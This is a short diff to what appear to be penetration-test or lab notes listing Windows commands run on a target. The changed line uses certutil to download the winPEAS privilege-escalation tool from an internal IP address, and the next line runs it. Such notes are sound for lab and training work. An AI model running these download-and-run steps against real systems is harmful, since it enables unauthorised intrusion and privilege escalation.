@@ -502,7 +502,7 @@ dir stuart
 net user
 cd public
 dir
-certutilexe -f -urlcache http://172.16.11.11/winPEASx64.exe winpeas.exe
+certutil.exe -f -urlcache http://172.16.11.11/winPEASx64.exe winpeas.exe
 winpeas.exe
 cd \xampp
 dir
